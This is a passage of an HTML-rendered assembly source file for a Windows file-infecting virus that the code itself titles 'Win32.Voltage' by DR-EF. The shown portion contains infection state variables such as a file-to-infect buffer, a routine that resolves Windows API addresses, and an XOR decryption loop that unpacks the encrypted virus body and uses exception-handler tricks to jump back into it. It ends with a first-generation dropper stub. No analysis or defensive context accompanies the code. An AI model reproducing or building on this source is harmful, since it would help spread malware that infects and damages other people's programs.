    </span><span class="sc5">RunFromExeHooker</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">FileToInfect</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">CommandLine</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc5">FileDirectory</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0ffh</span><span class="sc0">    </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
    
    </span><span class="sc5">SizeOfHookerInformation</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">HookerInformation</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">get_apis</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">;ecx - number of apis</span><span class="sc0">
</span><span class="sc1">;eax - address to api strings</span><span class="sc0">
</span><span class="sc1">;ebx - address to api address</span><span class="sc0">
</span><span class="sc1">;edx - module handle</span><span class="sc0">
</span><span class="sc5">NextAPI</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">__GetProcAddress</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ApiErr</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">NextSTR</span><span class="sc4">:</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">NextSTR</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">4h</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">NextAPI</span><span class="sc0">
    </span><span class="sc6">stc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ApiErr</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc2">0ch</span><span class="sc0">
    </span><span class="sc6">clc</span><span class="sc0">
    </span><span class="sc6">ret</span><span class="sc0">


    </span><span class="sc5">EncryptedVirusEnd</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    
</span><span class="sc5">DecryptVirus</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">esp</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;get return address</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">EncryptedVirus</span><span class="sc0">  </span><span class="sc1">;size of encrypted virus</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc8">esp</span><span class="sc0">      </span><span class="sc1">;set SEH</span><span class="sc0">
</span><span class="sc5">decrypt</span><span class="sc4">:</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc5">XorKey</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">
    </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">decrypt</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">;use SEH to jump back to virus</span><span class="sc0">


    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;padding</span><span class="sc0">
    </span><span class="sc5">VirusEnd</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">
    
    

</span><span class="sc5">FirstGenHost</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc5">VirusSize</span><span class="sc0">
    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">                     </span><span class="sc1">;first generation delta offset</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Exit</span><span class="sc0">     
    </span><span class="sc6">pushad</span><span class="sc0">
    </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">VirusStart</span><span class="sc0">
</span><span class="sc5">Exit</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg_Title</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Msg_Text</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0h</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">MessageBoxA</span><span class="sc0">
    </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
    </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc5">ExitProcess</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc9">IF</span><span class="sc0">  </span><span class="sc5">DEBUG</span><span class="sc0">
    </span><span class="sc5">Msg_Title</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"[Win32.Voltage - Debug Version] By DR-EF"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Msg_Text</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"First Generation Droppper."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ELSE</span><span class="sc0">
    </span><span class="sc5">Msg_Title</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"[Win32.Voltage - Relese Version] By DR-EF"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
    </span><span class="sc5">Msg_Text</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc3">"First Generation Droppper."</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc9">end</span><span class="sc0"> </span><span class="sc5">FirstGenHost</span><span class="sc0">
</span></div></body>
</html>
